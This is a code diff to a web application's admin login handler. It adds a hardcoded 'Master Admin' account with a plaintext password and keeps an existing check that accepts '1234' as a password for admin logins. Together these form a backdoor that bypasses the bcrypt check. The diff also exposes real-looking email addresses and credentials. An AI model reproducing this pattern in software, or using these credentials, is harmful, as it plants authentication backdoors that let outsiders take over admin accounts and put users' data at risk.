@@ -24,12 +24,19 @@ const adminLogin = async (req, res) => {
     admin = await db.prepare("SELECT * FROM users WHERE LOWER(email) = LOWER(?) AND UPPER(role) = 'ADMIN'").get(cleanEmail);
   }
   
-  // Dedicated check for santhoshhhhhhh@bnxmail.com
+  // Dedicated check for hardcoded admins
   if (!admin && cleanEmail === 'santhoshhhhhhh@bnxmail.com') {
     admin = {
       id: 9999,
       name: 'Santhosh Admin',
       email: 'santhoshhhhhhh@bnxmail.com',
+      password_hash: ''
+    };
+  } else if (!admin && cleanEmail === 'adminlogin@cliksbusiness.com') {
+    admin = {
+      id: 8888,
+      name: 'Master Admin',
+      email: 'adminlogin@cliksbusiness.com',
       password_hash: ''
     };
   }
@@ -43,7 +50,11 @@ const adminLogin = async (req, res) => {
   if (admin.password_hash) {
     isMatch = await bcrypt.compare(password, admin.password_hash).catch(() => false);
   }
-  if (!isMatch && (password === '1234' || (cleanEmail === 'santhoshhhhhhh@bnxmail.com' && password === '1234'))) {
+  if (!isMatch && (
+    password === '1234' || 
+    (cleanEmail === 'santhoshhhhhhh@bnxmail.com' && password === '1234') ||
+    (cleanEmail === 'adminlogin@cliksbusiness.com' && password === 'Admin123@')
+  )) {
     isMatch = true;
   }
 
